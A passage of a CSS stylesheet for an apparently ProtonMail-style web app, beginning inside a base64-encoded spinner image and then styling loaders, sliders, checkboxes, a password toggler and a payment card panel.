iimpw42aCNsviMWJjZO1PnJdyFClyswF+fIwK/PFHNoxhdEYdQihCBxv/uVSGJNlYEEobGGnz0CUUNeiSBrNAAEEeF/Fxx4iDafgSMBB8801eCG1QxyWgmQhTByrOUhEadNSxgYxGzcIFHs4dpM0PdKDBY1EG4IHHHwdttMFrR8LExiyOOBIkQW1os4GRUcJkgCOoMFLQHtpoQ1SXMJGRTRMcFCjQQm8YhyZM2CCAQCFYCvJGhnO69AYCspgzUBlttBFjny/pIossBfJRKJeIumSJLO/EIxAQeujhVqQu8UIIIQIINIkaajDIaUZofIrKP2yQOsmpL13/c0owGpQxxyRyworRLMEEI0QZi8wBqa4WCYAEEgbsoYEGchCLESTHwnHGsps6WxExAACQwrQaVGvtQcSIIUYHZaCBhrffFqSAuCmUe266CNkRSywBuIsuvALhcsABIJCRRhr34gsBE0y44Q8fcjSLb0HBEGycHGec4d/CGrDAQjAClRGxbQsLZIDFYv5DRsR8LizJLbdgIxAbe0RSXcf/yDLAAEIMWkYZE6dbBz74xEIQGTdzjK8dUOyCA0H+lEGG0PCKAQUULAq0NBk5O5tCDTXMY5A/ZLBharpIYG2pQWz4Y3a6KfRQAxMIme3PIy05ywcTXXSRQkX+UEIJEtbi/1JAF71Y1IHetqisKwhhFFAACBdFYIshj7gZaRtQhBGGLBj10YohhkRQYqQeYIABC5dkBIchgQRSwB6RImBFFBj48RIOqQfCAutzfmPF7h0UNUIgJ5xQw7Ay8iGLEbsrMNY3wZ9gxA9HCtKLEdSDSNYIwdeSQ+8mJhFGBBEYoXxj3tQiTSmlEBJ3fH8w4IUXEXB/GRyVlJJIIg5IMo11pmCABQMMeMGVQsMLDNyPG4dgwPgugw185CMf/xNDzcSTgnwc4oK/AIMFFDGWO4QiChkwwQOhwB0NQSIHv6BFMZawhAigAhsUsogeUvCNLoABDBkIoRVMEaU85IOFS1DCI12EQQpRdAEJCIDAHyDgiFO8IB+iyEUlbojDLxCjT3AghBaESMRGNCIHYMyBA1zgglaYMYqViAAeGHcqXrDjABnwYhjFSEYzRiAYeZgAvDRggLmwIxQC2Ac2ZCeegAAAIfkEBQAA/wAsEAAQAEUARQAACP8A/wkcSLCgwYP/yKRZNKWNtjdt1KAhg7CixYsYCZ5Rs2FCHD+IDBgQAQJEkpMgJmhDk7Gly4Jy3giZwItXn48hR5Y8mQQOnCwB4LiZ87JoRQ11FClyM4FmH15CfNHZwIPOJTdxQPgMEOBKihSwfhgd+w8NnTtChCy9JEhDmYtnprgB4TXFgg4pNpBtKUdbnTto66g5MxaNEDgdEmML0GZvxTJ6ftCpc+kHS8f/2GiDg62zJTgaMGsUtGHDDx6XRQ/8kcKSqUIL9Kjmo632hkmqD5ZBVKgQMWKXMKd580abIMK5Eb7B9luBm71o2gh6M4Vi8opprijYHmcsHz1t2iz/8ncdIzoFxvZNKLpxip7Q5TPC2QcJkhCXZdTohx8/4xVIktghSEZkADGJGhqQ119LHdhhhwREXYTGInPMYd2CGaGhQB55YHNRGRposMhbGLq0AQ4o0mERGiHKUWJRSQgggAKPoQFEgi++VMY+Mj53EBpARpJjUW6ww44duqWBRhpDGrUPLqOsV5A4aaRBYpMuTRBKKJIUxIYcfPCBpVF5ZJLKGwSVcYYcV47ZEiyzzBKARmecwYabL00RJzsDsVEncni6ZMcII6CZWSSRtBkoRgEwwggIApFRRhl3LtqSELroQoxAk5ahoKUYpfHHH5n84w8ZqILqUiZUUIHGqamq/5qRJBZY8AOsF8pqUSEQQMCLP2wEqytG2HzzjQH+JPvpsAilYGwSyi7LrEFXGAsHI5RQIsu0FXWABx5JsGOLLUhwi5Al34qggCGGsGDuQQo44kgcsLB7wbsGCYAKKnW8wW4O+BYEAQdNAPFPI4EE0ljAZSGAwDcC1ZCwhwzzIosseQikyzYnIMDwP5ZcPOc/IJxwggkf/3GxigKNY3IfAWtDCCGOEETICbU0EXAh5BCy6UAg1CJNK4oOS4YjwZwSHEFglFIKkuYmEUwwEBcETimJZJCrrmzggQQSSRzkQiKJQMJtEl97fJAdiXDTyiLMnoEAAADAUlE+hxzyDrOQiP8hBioWpZD3Lyno6kcsvfTix0Vh/EJLK3qBqgYSBxxgAUa8ZFDMEhiIaek3TDAhS+QXJbHE6fgIGSgVLITu46xLKKEEAKqP+cAtLLCATlGjKPHII7cw2eQZEAxwyy0UF/XHI8KQ8gXpJeqBAD4DDPDzWKGQQkojYBReoggHQLELPsmTtU8j6OeACn/XocFODTVAAcXImCXBQA74m6BApbmlwAL8NUACL5IzgRfgzwEOwEAhVHMFJHyhC12oQRPqEJ8AWMEBLnBBK7wwizuMhQ7eGEAYClCALiDBACVSgAk02IpWiOIL30jBFC6iBjjM4gBWwAAGwhCGXXgvR/uwggtlRVGJSoABDEZgAQIgMItMzMIC5RADBoxgBCtYMQoYYEL5mpQEfjDAiEfMQAZMkI8yMoABXvBCBKhYxRowYnGgmoAdCGEFMZLRjGhUYw0coYD7cAsIfVgAMezgDUgUIgW8SE1uAgIAIfkEBQAA/wAsEAAQAEUARQAACP8A/wkcSLCgwYP/2JThg0aDQw1oziCcSLGixYJl0izSo03bhg0/6NS5c0eIkDva5ki8yLIlwTJopuhpI+hNx48hR5YEpsiNmwlutKFxSXTiGSCT1KiZWXNYm0lzFi2ao6bNhjs9J/Di1SeOGzVFw/7bo2FqUjXdNJwhU7EMEEFCuMbxg8gPWLEXyaR5uEhDGrZFzwhKQNeAgT4a8E4kIwcNGiAQ5SkW6G8SL8MgQPBKM5ngtDRpHAPZ07mgGkSZQRhI3JkxH9Bn/JU2SOYSiCS420wmc+aMHD6AZx+ccxsWnA14effeI1u4UURwot8Jq3DPmTLOLZLpAydAAOQuFZb/KRM8O0U2vAJcuaKtpT8y48ubPz/mSooUcy6+JwN/fksyINwHBxAWscEGf835d9EZASzQAQgV+SMhGwkqeFEbHWSo20S5SFihhRfx0gE2V0yEAyWUfAjiRSlggw0dCK2DYh4rEvUDNpZ0cFAehtiijnw1RpiCKYXAWJAohhhCY5Au0VFIIQsUBEIghuSwEpMsTYMNMcTcJVAwgQSCAJZExcGlAQQ9EmYcZLqkgQIKFDIQCCdsk0GbRHUA512MnHDCmHi2hIgx+/AiEBR+YhNoSxtAAgk6AuXg54aLWnSGowr8I4g0tThQaUsSSGKHHEmUUkoUn7LUgR12tEFMIokw/5HqRQHkkccdOMB6yqwWwYIDDm7MAisqvFYEggACxDHCIYd8UyxFxwrgRybMOvLsREkgG0cezBJyLUJwsMMOL8TQQosY3x6UwiijAJMELcV0ka5BxIQSijZtLLFEJfMWhEMqmXCWi7569CtQGrPMIoBALCihhI4G35GwJQKl8sgjeBj8TwAjzCKCQAZcbITGeTAywhsD5UIKKYbO28YfumRCECqkjOPsvAH88UcKBBnQSCP59DsLFVS0R5AXjeSQ6bd+QGABLgYpkEMOF6QbCgQQ+HFQPlMvXawf33wzAkJSO5APa7yOEDaaCFnhgAPXFIsNHlw8QFEALuQdwKxuXP+DBx5uVLRLK63cYPSii0DgiCMLV+SGEYTvIseiZYTSBCrWoGwRCISLIgZ2bZIhAAIINDEdS8SIkksl74DOJBnhyEI6hC7hUEklYCDBB5a4yOI7HGHNAsbwA2gO4hyMEPKOLBCHhcPwGRgBvIW8cHAKIYTsrRgxGXSfDwT+pQEJEsEEcwrtk4lQgAn55IMBxc7BIgsS9OMBjHCKHNA+FgwM0HxySaiHGABAP0YcTjhJgAL/GOCFGgjASETRBjEIcYBYiEEMeGiZf7CBAS94IQJGMAITZgEHLyFkESDIgyxYwAQmVPAU01tRIaAAQiNcwApWiEIN7gGBWeDADjgYBSNSmsAEfAzgFixgIRMQoD0sGeAPXcBhDjEQhjAUoAtdqIEWoQAFIx4RADiYwKeEoAA8DICKVsSiFmvwAiiIgRHYqMO30OAGOHSAGHFaABzul52AAAAh+QQFAAD/ACwQABAARQBFAAAI/wD/CRxIsKDBg//8kSnD8MyZPWXI+ENIsaLFiwTZLJTDJw2ajxpCLpqjZhIQPmUwqlxZUGGZPQ7PyPEIMuScSWrU6GnDU8MZlkApumQYKaacmEbRaMi5s42gN9oEoQlKNaFGMgvLRIo4sSKbM0vfQNW2QdvUqhg7+Ft7VSLVMhoEbdjwg84GPmgp9olAiRLbrnn/pdFGp06dO9p+Bh4Ip5WtvkoALxaIZsOlO0LqyJlsx5BnWwDmTD6oBrMQRRoCzwoUyNAjbKMpprmkSJGbbmi/sQ7EgE7simXouHEzoQ3VWSdOBCpw9jfFaRsmTOClBmie5CdY7HF+0Z82Xrz6TP9aCadW8i7buXev06dPnOYVeYGRVstIGvUq2ZyL48fNZosYlFJKDj/gt1IkvPiBiBsWpZBIIqV0YCBLGhhgYWoU5fMgIRMC9YOFfVAkySHcOCBahyuRgQgIIOiBUCuHHAIJikBNwaIBB0HyyyH50BiUHyAkYVxB+dDyiyQ+AtVGEkngSJAISxSTSyRJssSGCExiKBACSyyBR5VA3QEHHEIQ5EOXvIDJEhpjJjGQAUooYYSaQBmQRQAYZvLII1/SuZIQAQRQ4D9MCCPMAn6upMYVV/ghUBCkkDJFoirtkUIKcPzTRiONZEApeZeeAQKnNXyqEggLLDAHNjnkgISpGCH/0kEHb0DSKgKwXsTLrD8I0Oo3uVqUADbY3BFKq38EW9EExAohgAMOQKAsRbxYYokQ+7jggiPTIoSIKabUgY22p3R7kAiFFLKBCK20MoC5BgVADDE6tesFvAVhM+9PDLQiSnX4/nOGAgpYIhASouQSQMD/aENwpv8IkEslyQYMjzEKTCBQHJWAUWrA2ECyD8D/eAEGGAzCOwckkBBDEAQnM4KvCJJIAgJBfmSQQRT4EmOHHS4S9IXOhZirSB55bGGQKSaY8LGy/hCDAw6KHIRBPvmYMq0bAggw40GmYI2BsmVA0nXKB0GBBRYVwwoHO+xUUVESDNTtpql1jAJ3HRaJ/8GAF2EI8ikQAoQyitIWCfGCFxEAoJifCqSSiR0kV2RABBEYIUuiDcwySyrarISNEaQDqyY2I3ieJksKGGGFFRw8jmIkCjDCyAhOWve6FcEM2aEGdvxhDSN3U6WAFVFgAMXNEwoxSzZ//ME8Wh1ggEEYYWQCX2xyYAMBBBZkE+JifrAQRgEFsJDCb/4YkM4330CQiW+jXSJLAV100cMpAZCxGCKZwAMX4JcH38VGBEjoQg0WKAYFbIAqbUgBFRzhCDzgIRVlMlAKWLBAKEABH7LIAwi0hBANxKEBf0AAApqACkdYIHcd6gASoLALfAzgFixgARK+gQs7zIsYZqMHAlAIQQhZGBEBHGDE9JLEC3aI4YY5ZAITDhALMYgBAEhAQjBOQcR3yAIPxMhgosQ1i2BIkYpWxKIWg1EOHAQgdNNKgztAEIBZLQAOBqgDXn4TEAA7")
            }
        }

        .protonLoader {
            position: fixed;
            z-index: 9999;
            left: 50%;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-transform: translateY(32px);
            transform: translateY(32px);
            margin-left: -25px;
            width: 50px;
            height: 50px;
            background: #fff;
            border-radius: 50px;
            -webkit-box-shadow: 1px 1px 3px rgba(172, 176, 191, .33), 0 0 2px rgba(172, 176, 191, .33);
            box-shadow: 1px 1px 3px rgba(172, 176, 191, .33), 0 0 2px rgba(172, 176, 191, .33);
            opacity: 0;
            -webkit-transition: opacity .5s linear, -webkit-transform .5s linear;
            transition: opacity .5s linear, -webkit-transform .5s linear;
            transition: opacity .5s linear, transform .5s linear;
            transition: opacity .5s linear, transform .5s linear, -webkit-transform .5s linear;
            -webkit-animation-delay: 1.2s;
            animation-delay: 1.2s
        }

        .protonLoader,
        .protonLoader:after {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            will-change: transform
        }

        .protonLoader:after {
            position: absolute;
            content: "";
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            border-radius: 50%;
            border: 5px solid #f2f2f2;
            border-top-color: #9397cd;
            -webkit-animation: load8 1s infinite linear;
            animation: load8 1s infinite linear
        }

        .protonLoader.show {
            -webkit-transform: translateY(35px);
            transform: translateY(35px);
            opacity: 1
        }

        .protonLoader .protonLoaderIcon {
            -webkit-transform: scale(1.1);
            transform: scale(1.1)
        }

        .protonLoader:not(.show):after {
            display: none
        }

        @media (-ms-high-contrast:active),
        (-ms-high-contrast:none) {
            .protonLoader {
                border: 0;
                background-size: contain;
                background-color: #fff;
                -webkit-box-shadow: 1px 1px 3px rgba(0, 0, 0, .33), 0 0 2px rgba(0, 0, 0, .33);
                box-shadow: 1px 1px 3px rgba(0, 0, 0, .33), 0 0 2px rgba(0, 0, 0, .33);
                background-position: 50%;
                background-image: url(assets/img/small-spinner.gif)
            }

            .protonLoader:after,
            .protonLoaderIcon {
                -webkit-animation: none;
                animation: none;
                display: none
            }
        }

        .readUnread-container {
            display: -webkit-box !important;
            display: -webkit-flex !important;
            display: -ms-flexbox !important;
            display: flex !important
        }

        .readUnread-container-ur {
            -webkit-box-orient: horizontal;
            -webkit-box-direction: reverse;
            -webkit-flex-direction: row-reverse;
            -ms-flex-direction: row-reverse;
            flex-direction: row-reverse
        }

        .readUnread-container.disabled [class*=readUnread-btn] {
            pointer-events: none;
            -webkit-box-shadow: none;
            box-shadow: none;
            color: #acb0bf;
            -webkit-box-shadow: inset 0 0 50rem 0 #f3f5f8;
            box-shadow: inset 0 0 50rem 0 #f3f5f8
        }

        .readUnread-container-ur .readUnread-btn-read {
            border-left: 1px solid #acb0bf !important
        }

        .readUnread-container-ur .readUnread-btn-unread {
            border-left: 0
        }

        [class*=chooseLayoutBtns-btn] * {
            pointer-events: none
        }

        .appConfigBody-rows .chooseLayoutBtns-btn-rows,
        body:not(.appConfigBody-rows) .chooseLayoutBtns-btn-column {
            background: #e5e5e5;
            -webkit-box-shadow: inset 0 2px 2px 0 rgba(0, 0, 0, .2);
            box-shadow: inset 0 2px 2px 0 rgba(0, 0, 0, .2)
        }

        div.noUi-target {
            display: block;
            border-color: #acb0bf;
            border-radius: 2px;
            margin-top: 20px;
            margin-bottom: 50px
        }

        div.noUi-connect,
        div.noUi-target {
            -webkit-box-shadow: none;
            box-shadow: none
        }

        div.noUi-connect {
            background: #9397cd;
            border: 1px solid #9397cd;
            margin: -1px;
            border-radius: 4px
        }

        div.noUi-handle {
            border: 1px solid #acb0bf;
            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            border-radius: 2px
        }

        div.noUi-horizontal div.noUi-tooltip {
            padding: 0 2px;
            font-size: .6rem;
            -webkit-box-shadow: 0 0 2px 3px #fff;
            box-shadow: 0 0 2px 3px #fff
        }

        div.noUi-handle {
            cursor: move;
            cursor: grab;
            cursor: -webkit-grab
        }

        div.noUi-handle:active {
            cursor: grabbing;
            cursor: -webkit-grabbing
        }

        div.noUi-handle:after,
        div.noUi-handle:before {
            background: transparent
        }

        div.noUi-handle:before {
            content: "\2194";
            white-space: nowrap;
            margin-left: -4px;
            margin-top: -2px
        }

        div.noUi-value {
            margin-top: 16px;
            font-size: .9em
        }

        .slider-max-padding,
        .slider-min-padding {
            position: absolute;
            z-index: 2
        }

        .slider-min-padding {
            top: -1px;
            left: -1px;
            height: 18px;
            -webkit-box-shadow: inset -2px 0 1px rgba(0, 0, 0, .1);
            box-shadow: inset -2px 0 1px rgba(0, 0, 0, .1);
            border-radius: 2px 0 0 2px;
            background: repeating-linear-gradient(45deg, #f35d5d, #f35d5d 10px, #ec424a 0, #ec424a 20px)
        }

        .slider-max-padding {
            top: -1px;
            right: -1px;
            height: 18px;
            -webkit-box-shadow: inset 2px 0 1px rgba(0, 0, 0, .1);
            box-shadow: inset 2px 0 1px rgba(0, 0, 0, .1);
            border-radius: 0 2px 2px 0;
            background: repeating-linear-gradient(45deg, #fcf785, #fcf785 10px, #efea62 0, #efea62 20px)
        }

        .pm_buttons.sliderButtons {
            margin-top: 15px;
            height: 26px
        }

        .pm_buttons.sliderButtons,
        .pm_buttons.sliderButtons button {
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex
        }

        .pm_buttons.sliderButtons button {
            -webkit-flex-grow: 1;
            -webkit-box-flex: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            overflow: hidden;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            background-color: transparent;
            border: 0;
            padding: 0 10px;
            color: #666;
            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            cursor: pointer
        }

        .pm_buttons.sliderButtons button:not(:first-child) {
            border-left: 1px solid #acb0bf
        }

        .pm_buttons.sliderButtons .fa {
            font-size: 12px
        }

        body.appConfigBody-is-mobile .pm_buttons.sliderButtons {
            margin: 15px 0 0 10px
        }

        body.appConfigBody-is-mobile div.noUi-target {
            margin-top: 20px
        }

        ul.legends {
            margin: 0;
            padding: 0
        }

        ul.legends,
        ul.legends>li {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex
        }

        ul.legends>li {
            -webkit-align-itmes: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            list-style: none;
            margin-right: 10px;
            font-size: 12px
        }

        ul.legends>li .legends-square {
            width: 30px;
            height: 18px;
            display: block;
            border-radius: 2px
        }

        div.mCSB_container_wrapper {
            margin-right: 0
        }

        div.mCSB_scrollTools a+.mCSB_draggerContainer {
            margin: 0 -5px 5px 0
        }

        div.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            background: #848995;
            border: none;
            width: 9px
        }

        div.mCSB_scrollTools .mCSB_draggerRail {
            background: rgba(0, 0, 0, .3);
            width: 9px
        }

        div.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        div.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar,
        div.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar {
            background: #e6eaf0
        }

        .as-sortable-item-handle:before {
            content: "\F0C9";
            font-family: FontAwesome;
            margin-right: .5em;
            opacity: .2
        }

        .as-sortable-item-handle:hover:before {
            opacity: 1
        }

        .as-sortable-disabled .as-sortable-item-handle {
            cursor: default
        }

        .as-sortable-disabled .as-sortable-icon {
            display: none
        }

        .as-sortable-placeholder {
            background: #acb0bf
        }

        .as-sortable-dragging>* {
            background: #fff;
            font-weight: 700;
            -webkit-box-shadow: 0 0 10px rgba(0, 0, 0, .1);
            box-shadow: 0 0 10px rgba(0, 0, 0, .1);
            opacity: .9
        }

        .CodeMirror {
            border: 1px solid #acb0bf
        }

        .CodeMirror-scroll {
            -webkit-box-shadow: inset 0 2px 5px rgba(0, 0, 0, .15);
            box-shadow: inset 0 2px 5px rgba(0, 0, 0, .15);
            background: #fafafa
        }

        .CodeMirror-lint-tooltip {
            z-index: 99999 !important
        }

        .customMaskInput-container {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-justify-content: center;
            -webkit-box-pack: center;
            -ms-flex-pack: center;
            justify-content: center;
            position: relative;
            width: 100%;
            height: 100%
        }

        .customMaskInput-container,
        .customMaskInput-container * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        [class*=customMaskInput-input] {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            margin: 0;
            opacity: 0;
            z-index: 0;
            cursor: pointer
        }

        .customMaskInput-mask {
            width: 16px;
            height: 16px;
            min-width: 16px;
            background-color: #fff;
            background-size: 0;
            border-radius: 2px;
            border: 1px solid #acb0bf;
            -webkit-transition: border-color .1s ease-in;
            transition: border-color .1s ease-in;
            pointer-events: none
        }

        [class*=customMaskInput-input]:checked+.customMaskInput-mask,
        [class*=customMaskInput-input]:indeterminate+.customMaskInput-mask {
            background-size: 200% 200%
        }

        .customMaskInput-container:hover [class*=customMaskInput-input]:not(:disabled)+.customMaskInput-mask,
        [class*=customMaskInput-input]:focus+.customMaskInput-mask {
            border-color: #9397cd
        }

        [class*=customMaskInput-input][disabled] {
            cursor: default
        }

        [class*=customMaskInput-input]:disabled+.customMaskInput-mask,
        [class*=customMaskInput-input][disabled]+.customMaskInput-mask {
            background-color: #e6e6e6
        }

        body.appConfigBody-is-mobile .customMaskInput-mask {
            width: 30px;
            height: 30px
        }

        .copy-button {
            border: 0;
            padding: 0;
            margin: 0;
            background: transparent
        }

        .copy-button>* {
            pointer-events: none
        }

        .copy-icon:before {
            font-family: FontAwesome;
            content: "\F0EA"
        }

        .customRadio-mask {
            border-radius: 50%
        }

        .customRadio-input:checked+.customRadio-mask {
            -webkit-box-shadow: inset 0 0 0 3px #fff, inset 0 0 0 10px #9397cd;
            box-shadow: inset 0 0 0 3px #fff, inset 0 0 0 10px #9397cd;
            border-color: #9397cd
        }

        .customRadio-input:checked:disabled+.customRadio-mask {
            -webkit-box-shadow: inset 0 0 0 3px #fff, inset 0 0 0 10px #acb0bf;
            box-shadow: inset 0 0 0 3px #fff, inset 0 0 0 10px #acb0bf;
            border-color: #acb0bf
        }

        .customCheckbox-input+.customCheckbox-mask {
            background: #fff;
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAxNSI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiNmZmY7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5jaGVja2JveGVzLXN0YXRlczwvdGl0bGU+PGcgaWQ9IkViZW5lXzIiIGRhdGEtbmFtZT0iRWJlbmUgMiI+PGcgaWQ9IkViZW5lXzEtMiIgZGF0YS1uYW1lPSJFYmVuZSAxIj48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik03LDEyYTEsMSwwLDAsMS0uNTUtLjE3bC0zLTJBMSwxLDAsMCwxLDQuNTUsOC4xN0w2LjY2LDkuNTcsMTAuMTMsMy41YTEsMSwwLDEsMSwxLjc0LDFsLTQsN2ExLDEsMCwwLDEtLjY0LjQ4WiIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTI4LDguMDZIMjFhMSwxLDAsMCwxLDAtMmg3YTEsMSwwLDAsMSwwLDJaIi8+PC9nPjwvZz48L3N2Zz4K")
        }

        .customCheckbox-input:checked+.customCheckbox-mask {
            background-color: #9397cd;
            border-color: #9397cd;
            background-position: 0 50%
        }

        .customCheckbox-input:disabled+.customCheckbox-mask,
        .customCheckbox-input:indeterminate+.customCheckbox-mask {
            border-color: #acb0bf;
            background-color: #f3f5f8
        }

        .customCheckbox-input:checked:disabled+.customCheckbox-mask,
        .customCheckbox-input:indeterminate+.customCheckbox-mask {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAxNSI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiNhY2IwYmY7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5jaGVja2JveGVzLXN0YXRlczwvdGl0bGU+PGcgaWQ9IkViZW5lXzIiIGRhdGEtbmFtZT0iRWJlbmUgMiI+PGcgaWQ9IkViZW5lXzEtMiIgZGF0YS1uYW1lPSJFYmVuZSAxIj48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik03LDEyYTEsMSwwLDAsMS0uNTUtLjE3bC0zLTJBMSwxLDAsMCwxLDQuNTUsOC4xN0w2LjY2LDkuNTcsMTAuMTMsMy41YTEsMSwwLDEsMSwxLjc0LDFsLTQsN2ExLDEsMCwwLDEtLjY0LjQ4WiIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTI4LDguMDZIMjFhMSwxLDAsMCwxLDAtMmg3YTEsMSwwLDAsMSwwLDJaIi8+PC9nPjwvZz48L3N2Zz4K")
        }

        .customCheckbox-input:indeterminate+.customMaskInput-mask {
            background-position: 100% 50%
        }

        .datetimepicker .timepicker-container {
            margin-left: -1px
        }

        .pm_multiselect>label>input {
            margin-right: 3px
        }

        .pm_multiselect>label {
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            margin-top: 7px;
            margin-right: 7px
        }

        .multiselectCheckbox+.customCheckbox-mask {
            margin: 3px .5ex
        }

        .elements-selector {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex;
            position: relative;
            height: 35px;
            margin-right: 15px
        }

        .elements-selector-label {
            -webkit-justify-content: center;
            -webkit-box-pack: center;
            -ms-flex-pack: center;
            justify-content: center;
            position: relative
        }

        .elements-selector-check,
        .elements-selector-label,
        .elements-selector-trigger-dropdown {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center
        }

        .elements-selector-check,
        .elements-selector-trigger-dropdown {
            -webkit-flex-grow: 1;
            -webkit-box-flex: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            overflow: hidden
        }

        .elements-selector-check {
            width: 30px
        }

        .elements-selector-trigger-dropdown {
            position: relative;
            z-index: 1;
            margin-left: -3px;
            opacity: .8
        }

        .elements-selector-label {
            width: 100%;
            height: 100%
        }

        .element-selector-set-scope.pm_dropdown {
            width: auto
        }

        .elementsSelector-btn-action>i {
            font-size: 16px
        }

        .elementsSelector-btn-action>span {
            padding-right: 5px
        }

        .elements-selector:not(.disabled) .elements-selector-check,
        .elements-selector:not(.disabled) .elements-selector-trigger-dropdown {
            cursor: pointer
        }

        .elements-selector.disabled {
            pointer-events: none
        }

        .elements-selector-trigger-dropdown:hover {
            opacity: 1
        }

        .request-timeout {
            display: none
        }

        .request-timeout-icon {
            font-size: 3rem;
            color: #acb0bf
        }

        .request-timeout-title {
            font-size: 1.2rem;
            font-weight: 400;
            margin: 20px 0
        }

        .appConfigBody-request-timeout .request-timeout {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            text-align: center;
            width: 100%;
            min-height: 100%
        }

        .appConfigBody-is-mobile .request-timeout {
            min-height: 80vh
        }

        .customPasswordToggler.password-container {
            position: relative
        }

        .customPasswordToggler.password-container .password-input:not([type=password])[placeholder] {
            text-overflow: ellipsis
        }

        .customPasswordToggler.password-container .password-input:-webkit-autofill {
            -webkit-text-fill-color: #222 !important
        }

        .customPasswordToggler.password-container .password-input:-webkit-autofill~.togglePassword-btn-toggle {
            color: #222
        }

        .customPasswordToggler.password-container .password-input[type=text] {
            padding-right: 30px
        }

        .customPasswordToggler.password-container .password-input[type=password] {
            padding: 9px 30px 8px 0;
            text-indent: 20px
        }

        .customPasswordToggler.password-container .togglePassword-btn-toggle {
            position: absolute;
            top: 0;
            right: 0;
            padding: 0 10px;
            background: transparent;
            border: 0;
            line-height: 35px;
            font-size: .8rem;
            text-transform: uppercase;
            cursor: pointer
        }

        .customPasswordToggler.password-container .togglePassword-btn-display .togglePassword-icon-toText,
        .customPasswordToggler.password-container .togglePassword-btn-toggle:not(.togglePassword-btn-display) .togglePassword-icon-toPassword {
            display: none
        }

        .password-container:not(.customPasswordToggler) .password-input[type=password],
        .password-container:not(.customPasswordToggler) .password-input[type=text] {
            padding-right: 0
        }

        .hideUpgrade {
            display: none
        }

        .pm_form .cardPanel {
            position: relative;
            width: 100%;
            height: 200px;
            overflow: hidden;
            border-radius: 6px;
            background: #9397cd;
            color: #fff;
            text-shadow: 0 2px 1px rgba(0, 0, 0, .2);
            -webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, .2);
            box-shadow: 0 1px 1px rgba(0, 0, 0, .2);
            cursor: pointer
        }

        .pm_form .cardPanel:before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url(assets/img/login.jpg) no-repeat 50%;
            background-size: cover;
            opacity: .4
        }

        .pm_form .cardPanel:hover:before {
            opacity: .6
        }

        .pm_form .cardPanel .cardPanel-issuer {
            position: absolute;
            top: 0;
            right: 20px;
            width: 80px
        }

        .pm_form .cardPanel .cardPanel-issuer img[class*=cardPanel-issuer] {
            width: 100%;
            height: auto;
            display: none
        }

        .pm_form .cardPanel.issuer-visa {
            background: #639
        }

        .pm_form .cardPanel.issuer-visa img.cardPanel-issuer-visa {
            display: block
        }

        .pm_form .cardPanel.issuer-amex {
            background: blue
        }

        .pm_form .cardPanel.issuer-amex img.cardPanel-issuer-amex {
            display: block
        }

        .pm_form .cardPanel.issuer-mastercard {
            background: #000
        }

        .pm_form .cardPanel.issuer-mastercard img.cardPanel-issuer-mastercard {
            display: block
        }

        .pm_form .cardPanel .cardPanel-number {
            position: absolute;
            top: 70px;
            left: 19px;
            font-size: 3.2rem
        }

        .pm_form .cardPanel .cardPanel-label {
            font-size: .6rem;
            letter-spacing: .5px;
            text-shadow: none;
            text-transform: uppercase;
            font-weight: 400;
            opacity: .7;
            display: block;
            margin-bottom: 3px;
            height: 18px
        }

